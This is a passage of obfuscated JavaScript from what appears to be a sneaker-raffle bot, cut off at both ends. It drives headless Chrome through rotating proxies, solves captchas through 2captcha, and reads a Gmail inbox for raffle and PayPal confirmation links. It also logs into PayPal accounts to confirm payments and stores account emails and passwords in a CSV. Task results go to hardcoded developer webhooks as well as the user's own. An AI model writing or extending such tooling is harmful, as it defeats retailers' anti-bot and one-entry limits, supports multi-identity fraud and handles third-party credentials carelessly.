        return _0x442b6d['Password'] = _0x3c33a2['Password'], _0x13dabd['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x442b6d['Email'] + ',' + _0x442b6d['Password'] + ',' + _0x442b6d['Proxy']), _0x442b6d;
    }
    let _0xc5667e = await _0x3ad1ae();
    var _0x5eb0e7 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x216ce4 = await _0x4111eb['get']('Amount'), _0x313f0c = _0x216ce4['Amount'];
    async function _0x3f9493() {
        let _0x516cf5 = 0x0;
        var _0x590b70 = new _0x108c6b({
            'user': _0x50b722['masterMail'],
            'password': _0x50b722['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x4fbef8(_0x413ed4) {
            _0x590b70['openBox']('INBOX', ![], _0x413ed4);
        }
        _0x590b70['once']('ready', function () {
            _0x4fbef8(function (_0x48e8ed, _0x343f49) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x48e8ed)
                    throw _0x48e8ed;
                _0x590b70['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x2ea564, _0x326c68) {
                    if (!_0x326c68 || !_0x326c68['length'])
                        console['log'](_0x391006() + '\x20[' + _0x47e0e0 + ']\x20No\x20mails\x20found'), _0x590b70['end']();
                    else {
                        _0x326c68 = _0x326c68['slice'](0x0, _0x313f0c);
                        var _0x335158 = _0x590b70['seq']['fetch'](_0x326c68, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x335158['on']('message', function (_0x5745e7, _0x3e03ea) {
                            var _0x34980d = '(#' + _0x3e03ea + ')\x20';
                            _0x5745e7['on']('body', function (_0x42b05d, _0x48b556) {
                                _0x2e7895(_0x42b05d, (_0x58ad4a, _0x3f1705) => {
                                    if (_0x3f1705['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x3f1705['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x3f1705['text']['split']('[')[0x2];
                                        var _0x3a20d2 = mes['split'](']')[0x0];
                                        _0x5eb0e7['push'](_0x3a20d2);
                                    }
                                });
                            }), _0x5745e7['once']('end', function () {
                                _0x516cf5++;
                            });
                        }), _0x335158['once']('error', function (_0x1adbc5) {
                            console['log']('Fetch\x20error:\x20' + _0x1adbc5);
                        }), _0x335158['once']('end', function () {
                            _0x590b70['end']();
                        });
                    }
                });
            });
        }), _0x590b70['once']('error', function (_0x41b2ca) {
            console['log'](_0x34d98c['red'](_0x41b2ca['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x590b70['once']('end', async function () {
        }), _0x590b70['connect']();
    }
    try {
        _0x3f9493(), await _0xfa5357(0xfa0), console['log']('Found\x20' + _0x5eb0e7['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xfa5357(0xfa0);
    }
    var _0x91211b;
    _0x3b7620('' + _0x47e0e0);
    var _0x136572 = _0xc5667e['Proxy']['split'](':'), _0xa8a5f4;
    try {
        _0xa8a5f4 = await _0x1528cf['launch']({
            'userDataDir': 'sessions/' + _0xc5667e['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x136572[0x0] + ':' + _0x136572[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0xa8a5f4 = await _0x1528cf['launch']({
            'userDataDir': 'sessions/' + _0xc5667e['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x136572[0x0] + ':' + _0x136572[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x391006() + '\x20[' + _0x47e0e0 + ']\x20Getting\x20Session');
        const _0x1cbec3 = await _0xa8a5f4['newPage']();
        await _0x1cbec3['authenticate']({
            'username': '' + _0x136572[0x2],
            'password': '' + _0x136572[0x3]
        }), await _0x1cbec3['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x1cbec3['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x391006() + '\x20[' + _0x47e0e0 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x1cbec3['waitForSelector']('#email');
            let _0x1072d7 = await _0x1cbec3['$eval']('#email', _0x2cecd7 => _0x2cecd7['getAttribute']('value'));
            if (_0x1072d7 == '') {
                await _0x1cbec3['type']('#email', _0xc5667e['Email']), await _0xfa5357(0x1d3);
                let _0x39b1f0 = await _0x1cbec3['$']('#splitPassword');
                _0x39b1f0 && (await _0x1cbec3['click']('#btnNext'), await _0xfa5357(0xa28)), await _0x1cbec3['type']('#password', _0xc5667e['Password']), await _0xfa5357(0x35c), await _0x1cbec3['click']('#btnLogin');
            } else
                await _0x1cbec3['type']('#password', _0xc5667e['Password']), await _0xfa5357(0x35c), await _0x1cbec3['click']('#btnLogin');
            await _0x1cbec3['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x391006() + '\x20[' + _0x47e0e0 + ']\x20Successfully\x20logged\x20in'), await _0xfa5357(0x2710);
        } catch (_0x20b243) {
            throw new Error('Login\x20session\x20expired\x20' + _0x20b243);
        }
        for (var _0x3fc538 = 0x0; _0x3fc538 < _0x5eb0e7['length']; _0x3fc538++) {
            console['log'](_0x391006() + '\x20[' + _0x47e0e0 + ']\x20Task\x20' + (_0x3fc538 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x3b7620(_0x47e0e0 + '\x20Task\x20' + (_0x3fc538 + 0x1) + '\x20/\x20' + _0x5eb0e7['length']);
            const _0x291b04 = await _0xa8a5f4['newPage']();
            await _0x291b04['goto']('' + _0x5eb0e7[_0x3fc538], { 'waitUntil': 'networkidle2' }), await _0xfa5357(0xbb8);
            try {
                const _0x4bd6a9 = await _0x291b04['$']('#challenge-heading');
                _0x4bd6a9 && (console['log'](_0x391006() + '\x20[' + _0x47e0e0 + ']\x20Task\x20' + (_0x3fc538 + 0x1) + '\x20:\x20' + _0x34d98c['yellow']('2FA\x20Required')), await _0x291b04['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0xfa5357(0x9c40), await _0x291b04['waitForSelector']('#payment-submit-btn'), await _0x291b04['$eval']('#payment-submit-btn', _0x9b850c => _0x9b850c['click']()), await _0x291b04['click']('#payment-submit-btn');
                try {
                    await _0x291b04['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0xfa5357(0x5dc), console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x47e0e0 + ']\x20Task\x20' + (_0x3fc538 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x5611ce) {
                    _0x148754 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x5611ce['message']);
                } finally {
                    if (_0x148754 == 'yes' && _0xf109ac != 0x2) {
                        console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x47e0e0['name'] + ']\x20Task\x20' + (_0x3fc538 + 0x1) + '\x20:\x20Retrying\x20(' + _0xf109ac + '\x20/\x205)')), _0x3fc538 = _0x3fc538 - 0x1, _0xf109ac = _0xf109ac + 0x1;
                        continue;
                    }
                    _0x148754 == 'yes' && _0xf109ac >= 0x2 && (_0x3003c7(csv[_0x3fc538], _0x47e0e0), _0x148754 = 'no', _0xf109ac = 0x0), await _0x291b04['close'](), await _0xfa5357(0x4650);
                }
            } catch (_0x20dc08) {
                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x47e0e0 + ']\x20Task\x20' + (_0x3fc538 + 0x1) + '\x20:\x20' + _0x20dc08));
            }
        }
    } catch (_0x28cbdd) {
        console['log'](_0x34d98c['red']('' + _0x28cbdd));
    } finally {
        await _0xa8a5f4['close']();
    }
}
const _0x241653 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x22240b, _0x11a8bf, _0x3b2c3a) {
                    _0x1528cf['use'](_0x3af7cd()), _0x1528cf['use'](_0x2a16d3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x50b722['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xdd414e = 0x0; _0xdd414e < _0x11a8bf['length']; _0xdd414e++) {
                        if (_0x4771b6 != 'yes')
                            var _0x4771b6 = '', _0xfd68ce = 0x0;
                        var _0x4ed739;
                        try {
                            await _0x559c6d(_0x11a8bf, _0xdd414e);
                        } catch {
                            _0x4771b6 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x3b7620(_0x22240b['name'] + '\x20Task\x20' + (_0xdd414e + 0x1) + '\x20/\x20' + _0x11a8bf['length'] + '\x20||\x20File:\x20' + _0x55dc9b + '\x20Proxies:\x20' + _0x40851);
                        var _0x529bdd = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x2486f3 = Math['round'](Math['random']() * (_0x529bdd['length'] - 0x1));
                        _0x11a8bf[_0xdd414e]['Size'] == 'RANDOM' && (_0x11a8bf[_0xdd414e]['Size'] = _0x529bdd[_0x2486f3]);
                        var _0x5503a8 = Math['round'](Math['random']() * (_0x3b2c3a['length'] - 0x1)), _0x1461c4 = _0x3b2c3a[_0x5503a8]['split'](':'), _0x102008;
                        try {
                            _0x102008 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1461c4[0x0] + ':' + _0x1461c4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x102008 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1461c4[0x0] + ':' + _0x1461c4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x391006() + '\x20[' + _0x22240b['name'] + ']\x20Task\x20' + (_0xdd414e + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x1fea3a = await _0x102008['newPage']();
                            await _0x1fea3a['authenticate']({
                                'username': '' + _0x1461c4[0x2],
                                'password': '' + _0x1461c4[0x3]
                            }), await _0x1fea3a['setRequestInterception'](!![]), _0x1fea3a['on']('request', _0x179be4 => {
                                _0x179be4['resourceType']() === 'image' || _0x179be4['resourceType']() === 'font' || _0x179be4['resourceType']() === 'media' ? _0x179be4['abort']() : _0x179be4['continue']();
                            }), await _0x1fea3a['goto'](_0x11a8bf[_0xdd414e]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x391006() + '\x20[' + _0x22240b['name'] + ']\x20Task\x20' + (_0xdd414e + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x1fea3a['waitForSelector']('#accept-all-gdpr'), await _0x1fea3a['click']('#accept-all-gdpr'), await _0x1fea3a['waitForSelector']('#raffles-product'), await _0xfa5357(0x3e8), await _0x1fea3a['$eval']('#raffles-product', _0xd343b => _0xd343b['click']()), await _0xfa5357(0x1388), await _0x1fea3a['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x335338 = await _0x1fea3a['$']('.fancybox-inner\x20>\x20iframe'), _0x251c7d = await _0x335338['contentFrame']();
                            console['log'](_0x391006() + '\x20[' + _0x22240b['name'] + ']\x20Task\x20' + (_0xdd414e + 0x1) + '\x20:\x20Checking\x20Information'), await _0x251c7d['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0xfa5357(0x1f4), await _0x251c7d['type']('input[name=\x22sm-form-email\x22]', _0x11a8bf[_0xdd414e]['Email']), await _0xfa5357(0xc8), await _0x251c7d['type']('input[name=\x22sm-form-name\x22]', _0x11a8bf[_0xdd414e]['FirstName'] + '\x20' + _0x11a8bf[_0xdd414e]['LastName']), await _0xfa5357(0xc8), await _0x251c7d['type']('input[name=\x22sm-form-street\x22]', _0x11a8bf[_0xdd414e]['Address1'] + '\x20' + _0x11a8bf[_0xdd414e]['HouseNumber'] + '\x20' + _0x11a8bf[_0xdd414e]['Address2']), await _0xfa5357(0xc8), await _0x251c7d['type']('input[name=\x22sm-form-city\x22]', _0x11a8bf[_0xdd414e]['City']), await _0xfa5357(0xc8), await _0x251c7d['type']('input[name=\x22sm-form-province\x22]', _0x11a8bf[_0xdd414e]['State']), await _0xfa5357(0xc8), await _0x251c7d['type']('input[name=\x22sm-form-zip\x22]', _0x11a8bf[_0xdd414e]['Zip']), await _0xfa5357(0xc8), await _0x251c7d['type']('input[name=\x22sm-form-country\x22]', _0x11a8bf[_0xdd414e]['Country']), await _0xfa5357(0xc8), await _0x251c7d['type']('input[name=\x22sm-form-phone\x22]', _0x11a8bf[_0xdd414e]['Phone']), await _0xfa5357(0xc8), await _0x251c7d['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x11a8bf[_0xdd414e]['Follower']), await _0xfa5357(0xc8), await _0x251c7d['type']('input[name=\x22sm-cst.size\x22]', _0x11a8bf[_0xdd414e]['Size']), await _0xfa5357(0x1f4), await _0x251c7d['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0xfa5357(0x1f4), await _0x251c7d['click']('.icheckbox_simple-custom'), await _0xfa5357(0x1f4), console['log'](_0x391006() + '\x20[' + _0x22240b['name'] + ']\x20Task\x20' + (_0xdd414e + 0x1) + '\x20:\x20Sending\x20Request'), await _0x251c7d['$eval']('form', _0x2f5f7b => _0x2f5f7b['submit']()), console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x22240b['name'] + ']\x20Task\x20' + (_0xdd414e + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x4771b6 = '';
                            var _0x4ce644 = await _0xc964cf(_0x11a8bf[_0xdd414e], _0x22240b, 'dev', ![]), _0x5797a1 = await _0xc964cf(_0x11a8bf[_0xdd414e], _0x22240b, 'pub', ![]);
                            const _0x23246e = {
                                'succesDEVMSG': { 'embeds': [_0x4ce644] },
                                'succesPUBMSG': { 'embeds': [_0x5797a1] }
                            };
                            try {
                                _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x23246e['succesDEVMSG']), await _0xfa5357(0xc8), await _0x33437b(_0xee2818, _0x23246e['succesDEVMSG']), await _0xfa5357(0xc8), await _0x33437b(_0x471d14, _0x23246e['succesPUBMSG']);
                            } catch (_0x39745f) {
                                console['log'](_0x34d98c['yellow'](_0x391006() + '\x20[' + _0x22240b['name'] + ']\x20Task\x20' + (_0xdd414e + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x39745f));
                            }
                        } catch (_0x1be98a) {
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x22240b['name'] + ']\x20Task\x20' + (_0xdd414e + 0x1) + '\x20:\x20' + _0x1be98a)), _0x4ed739 = '' + _0x1be98a;
                            var _0x390df8 = await _0xc964cf(_0x11a8bf[_0xdd414e], _0x22240b, 'dev', !![], _0x4ed739), _0x4ce644 = await _0xc964cf(_0x11a8bf[_0xdd414e], _0x22240b, 'dev', ![]), _0x5797a1 = await _0xc964cf(_0x11a8bf[_0xdd414e], _0x22240b, 'pub', ![]);
                            const _0xe4febb = {
                                'succesDEVMSG': { 'embeds': [_0x4ce644] },
                                'succesPUBMSG': { 'embeds': [_0x5797a1] }
                            };
                            _0xe4febb['errorDEV'] = { 'embeds': [_0x390df8] }, _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0xe4febb['errorDEV']), await _0x33437b(_0x5e1645, _0xe4febb['errorDEV']), _0x1be98a != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x4771b6 = 'yes');
                        } finally {
                            _0x102008['close']();
                            if (_0x4771b6 == 'yes' && _0xfd68ce != 0x5 && _0x4ed739 != 'Size\x20Not\x20Found') {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x22240b['name'] + ']\x20Task\x20' + (_0xdd414e + 0x1) + '\x20:\x20Retrying\x20(' + _0xfd68ce + '\x20/\x205)\x20')), _0xdd414e = _0xdd414e - 0x1, _0xfd68ce = _0xfd68ce + 0x1;
                                continue;
                            }
                            _0x4771b6 == 'yes' && _0xfd68ce >= 0x5 && (_0x3003c7(_0x11a8bf[_0xdd414e], _0x22240b), _0x4771b6 = 'no', _0xfd68ce = 0x0), console['log'](_0x391006() + '\x20[' + _0x22240b['name'] + ']\x20Waiting\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x307df7, _0x174b58) {
                    var _0x13ea37 = [];
                    async function _0x5e763c() {
                        var _0x38e5c8 = new _0x108c6b({
                            'user': _0x50b722['masterMail'],
                            'password': _0x50b722['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x41e443(_0x13ea66) {
                            _0x38e5c8['openBox']('INBOX', ![], _0x13ea66);
                        }
                        _0x38e5c8['once']('ready', function () {
                            _0x41e443(function (_0x2b821a, _0x43597d) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x2b821a)
                                    throw _0x2b821a;
                                _0x38e5c8['seq']['search'](['UNSEEN'], function (_0x50415c, _0x147389) {
                                    if (!_0x147389 || !_0x147389['length'])
                                        console['log'](_0x391006() + '\x20[' + _0x307df7['name'] + ']\x20No\x20mails\x20found'), _0x38e5c8['end']();
                                    else {
                                        var _0x297da0 = _0x38e5c8['seq']['fetch'](_0x147389, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x297da0['on']('message', function (_0x4778d7, _0x498b1d) {
                                            var _0x18ddff = '(#' + _0x498b1d + ')\x20';
                                            _0x4778d7['on']('body', function (_0xf539, _0x35e311) {
                                                _0x2e7895(_0xf539, (_0x153231, _0x6fbcf1) => {
                                                    if (_0x6fbcf1['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x4167a0 = _0x6fbcf1['html']['split']('\x0a');
                                                        for (var _0x1e1cba = 0x0; _0x1e1cba < _0x4167a0['length']; _0x1e1cba++) {
                                                            if (_0x4167a0[_0x1e1cba]['includes']('salesmanago') && _0x4167a0[_0x1e1cba]['includes']('<td') && _0x4167a0[_0x1e1cba]['includes']('href')) {
                                                                var _0x399a8e = _0x4167a0[_0x1e1cba]['split']('href=\x22'), _0x4505b6 = _0x399a8e[0x1]['split']('\x22')[0x0];
                                                                _0x13ea37['push'](_0x4505b6);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x4778d7['once']('end', function () {
                                            });
                                        }), _0x297da0['once']('error', function (_0x22a257) {
                                            console['log']('Fetch\x20error:\x20' + _0x22a257);
                                        }), _0x297da0['once']('end', function () {
                                            _0x38e5c8['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x38e5c8['once']('error', function (_0x56e12d) {
                            console['log'](_0x34d98c['red'](_0x56e12d['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x38e5c8['once']('end', async function () {
                        }), _0x38e5c8['connect']();
                    }
                    async function _0x1aea22(_0x58847c, _0x367b40, _0x4470fc) {
                        for (var _0x461e73 = 0x0; _0x461e73 < _0x367b40['length']; _0x461e73++) {
                            async function _0x4587ed(_0xe1007a, _0x4138d0, _0x494e2d, _0x99b24c, _0x1c072f) {
                                var _0x26d9a8, _0x358051 = {}, _0xe014c9 = [], _0x3d45f7 = {}, _0x36baec = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0xab1230 = Math['round'](Math['random']() * (_0x36baec['length'] - 0x1));
                                _0x99b24c[_0xe1007a]['Size'] == 'RANDOM' && (_0x99b24c[_0xe1007a]['Size'] = _0x36baec[_0xab1230]);
                                !_0x99b24c && (_0x99b24c = {});
                                if (_0x50b722['useRandomProxy'] = ![])
                                    var _0x30df56 = _0x1c072f[_0xe1007a]['split'](':');
                                else
                                    var _0x781ae6 = Math['round'](Math['random']() * (_0x1c072f['length'] - 0x1)), _0x30df56 = _0x1c072f[_0x781ae6]['split'](':');
                                var _0x38a8a6 = {
                                    'jar': _0x15c37f,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x494e2d['url'],
                                    'headers': _0x494e2d['headers'],
                                    'body': JSON['stringify'](_0x358051),
                                    'proxy': 'http://' + _0x30df56[0x2] + ':' + _0x30df56[0x3] + '@' + _0x30df56[0x0] + ':' + _0x30df56[0x1]
                                };
                                return _0x4138d0 != 'ver' && (_0x38a8a6['url'] = _0x494e2d['url'], _0x38a8a6['headers'] = _0x494e2d['headers']), _0x4138d0 == 'ver' && (_0x38a8a6['method'] = 'GET', _0x38a8a6['url'] = _0x99b24c[_0xe1007a]), new Promise(function (_0x1754e9, _0x3cf783) {
                                    callback = async (_0x411311, _0x53729c, _0x1a72a1) => {
                                        if (!_0x411311 && _0x53729c['statusCode'] == 0xca || !_0x411311 && _0x53729c['statusCode'] == 0xc8) {
                                            if (_0x4138d0 != 'ver') {
                                                var _0x17c98f = await _0xc964cf(_0x99b24c[_0xe1007a], _0x494e2d, 'dev', ![]), _0x2e9f76 = await _0xc964cf(_0x99b24c[_0xe1007a], _0x494e2d, 'pub', ![]);
                                                const _0x35f19e = {
                                                    'succesDEVMSG': { 'embeds': [_0x17c98f] },
                                                    'succesPUBMSG': { 'embeds': [_0x2e9f76] }
                                                };
                                                if (_0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '')
                                                    try {
                                                        await _0x33437b(_0x50b722['webhook'], _0x35f19e['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xfa5357(0xc8), await _0x33437b(_0xee2818, _0x35f19e['succesDEVMSG']), await _0xfa5357(0xc8);
                                                try {
                                                    await _0x33437b(_0x471d14, _0x35f19e['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x253d32(_0x99b24c[_0xe1007a], _0x494e2d);
                                            }
                                            _0x1754e9(console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x494e2d['name'] + ']\x20Task\x20' + (_0xe1007a + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x4138d0 != 'ver') {
                                                var _0x5bd7df = '' + _0x411311, _0x259ebc = await _0xc964cf(_0x99b24c[_0xe1007a], _0x494e2d, 'dev', !![], _0x5bd7df), _0x4ca870 = {};
                                                _0x4ca870['errorDEV'] = { 'embeds': [_0x259ebc] }, _0x3003c7(_0x99b24c[_0xe1007a], _0x494e2d), _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x4ca870['errorDEV']), await _0x33437b(_0x5e1645, _0x4ca870['errorDEV']);
                                            }
                                            _0x3cf783(console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x494e2d['name'] + ']\x20Task\x20' + (_0xe1007a + 0x1) + ':\x20' + _0x411311)));
                                        }
                                    };
                                    try {
                                        _0x4138d0 != 'ver' ? console['log'](_0x391006() + '\x20[' + _0x494e2d['name'] + ']\x20Task\x20' + (_0xe1007a + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x358051['data']['attributes']['email']) : console['log'](_0x391006() + '\x20[' + _0x494e2d['name'] + ']\x20Task\x20' + (_0xe1007a + 0x1) + ':\x20Fetching\x20Response'), _0x5b7593(_0x38a8a6, callback);
                                    } catch (_0x2f15d6) {
                                        console['log'](_0x391006() + '\x20Task\x20' + (_0xe1007a + 0x1) + ':\x20' + _0x2f15d6);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x4587ed(_0x461e73, 'ver', _0x58847c, _0x367b40, _0x4470fc), console['log'](_0x391006() + '\x20[' + _0x58847c['name'] + ']\x20Sleeping\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                            } catch (_0x389a5f) {
                            }
                        }
                    }
                    try {
                        _0x5e763c(), await _0xfa5357(0xfa0), console['log']('Found\x20' + _0x13ea37['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x1aea22(_0x307df7, _0x13ea37, _0x174b58);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x310753, _0x52188c, _0x3ed895) {
                for (var _0x5b4b28 = 0x0; _0x5b4b28 < _0x52188c['length']; _0x5b4b28++) {
                    _0x50b722['AfewDelay'] = _0x50b722['delay'];
                    var _0x2697ec;
                    if (_0x120ca2 != 'yes')
                        var _0x120ca2 = '', _0x3f4f22 = 0x0;
                    var _0x4932d7 = _0x52188c[_0x5b4b28]['Url'], _0x3a5b35 = _0x52188c[_0x5b4b28];
                    _0x3b7620(_0x310753['name'] + '\x20Task\x20' + (_0x5b4b28 + 0x1) + '\x20/\x20' + _0x52188c['length'] + '\x20||\x20File:\x20' + _0x55dc9b + '\x20Proxies:\x20' + _0x40851);
                    try {
                        await _0x559c6d(_0x52188c, _0x5b4b28);
                    } catch {
                        _0x120ca2 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x2dc759(_0x5bc48f) {
                        const _0x323616 = _0x13dabd['readFileSync']('../successful-tasks.csv', 'utf8'), _0xd07957 = _0x3d5697['parse'](_0x323616, { 'header': !![] })['data'];
                        let _0x433008 = ![];
                        for (var _0x200660 of _0xd07957) {
                            if (_0x200660['Url'] == _0x5bc48f['Url'] && _0x200660['Email'] == _0x5bc48f['Email']) {
                                _0x433008 = !![];
                                break;
                            }
                        }
                        return _0x433008;
                    }
                    if (await _0x2dc759(_0x52188c[_0x5b4b28]) == !![]) {
                        console['log'](_0x391006() + '\x20[' + _0x310753['name'] + ']\x20Task\x20' + (_0x5b4b28 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x5dde6e = await _0xc964cf(_0x52188c[_0x5b4b28], _0x310753, 'dev', ![]), _0x2f7e36 = await _0xc964cf(_0x52188c[_0x5b4b28], _0x310753, 'pub', ![]);
                    const _0x5f16f5 = {
                        'succesDEVMSG': { 'embeds': [_0x5dde6e] },
                        'succesPUBMSG': { 'embeds': [_0x2f7e36] }
                    };
                    if (_0x52188c[_0x5b4b28]['Email'] == '' || _0x52188c[_0x5b4b28]['FirstName'] == '' || _0x52188c[_0x5b4b28]['LastName'] == '' || _0x52188c[_0x5b4b28]['Country'] == '' || _0x52188c[_0x5b4b28]['Size'] == '' || _0x52188c[_0x5b4b28]['Address1'] == '' || _0x52188c[_0x5b4b28]['Zip'] == '') {
                        console['log'](_0x391006() + '\x20[' + _0x310753['name'] + ']\x20Task\x20' + (_0x5b4b28 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x50b722['useRandomProxy'] = ![])
                        var _0xcb1861 = _0x3ed895[_0x5b4b28]['split'](':');
                    else
                        var _0x5d7456 = Math['round'](Math['random']() * (_0x3ed895['length'] - 0x1)), _0xcb1861 = _0x3ed895[_0x5d7456]['split'](':');
                    var _0x5994b0;
                    try {
                        _0x5994b0 = await _0x1528cf['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xcb1861[0x0] + ':' + _0xcb1861[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x5994b0 = await _0x1528cf['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xcb1861[0x0] + ':' + _0xcb1861[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
